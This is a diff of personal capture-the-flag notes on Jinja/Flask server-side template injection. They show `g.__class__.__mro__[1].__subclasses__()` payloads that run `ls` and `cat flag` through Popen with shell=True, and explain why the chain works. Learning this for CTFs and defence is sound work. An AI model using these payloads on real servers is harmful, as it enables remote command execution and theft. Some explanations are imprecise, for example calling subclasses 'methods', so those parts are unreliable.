@@ -44,11 +44,7 @@
 
 - In flask apps there is a special variable `g` to store information during a request that means it holds the ability to reference few other variables too one of which might have a function that can make a call outside the sandbox.
 
-
-
 **TODO: learn more here**
-
-- then `__class__` this returns class of an object.
 
 - `__mro__` returns base class of a class.
 
@@ -73,6 +69,40 @@
   - `g.__class__.__mro__[1].__subclasses__()[356]('ls', shell=True, stdout=-1).communicate()[0]` this show all the files in the current folder and there is a file named flag.
   
   - `g.__class__.__mro__[1].__subclasses__()[356]('cat flag', shell=True, stdout=-1).communicate()[0]` this gives us the actual flag and voila.
+  
+  - Let's look at `popen` 
+    
+    - 1st argument is the command that needs to run. 
+    
+    - 2nd tells python to run the command inside a shell, so basically `/bin/sh -c` and now it supports all type of shorthands like `||, && and *`.
+    
+    - 3rd argument sets the standard output of the process to be captured via pipe. Normal mode it is set to `subprocess.PIPE` which is same as -1.
+    
+    - `.communiocate()` waits for the process to finish and returns a tuple `(stdout_data, stderr_data)`. we take out the data by using `[0]`
+  
+  - `os.popen('cat flag').read()` → simpler, directly returns output.
+  
+  - `subprocess.Popen(...)` → more flexible, can capture both stdout and stderr, set env vars, etc., but requires `.communicate()` to actually get the data.
+
+- `__class__` tell which class you are.
+
+- `__mro__` is Method Resolution Order. It's a tuple of classes that python searches when looking up a method
+
+- ```
+  "hello".__class__
+  # <class 'str'>
+  
+  
+  int.__mro__
+  # (<class 'int'>, <class 'object'>)
+  
+  ```
+  
+  - The `object` here by `__mro__` is the base of all classes in python. So now we can use any python method that the app can use.
+
+- `__subclasses__` tell all the methods available to the the object and refer to it.
+
+- so now we can just use any method just by using indexing.
 
 ---
 
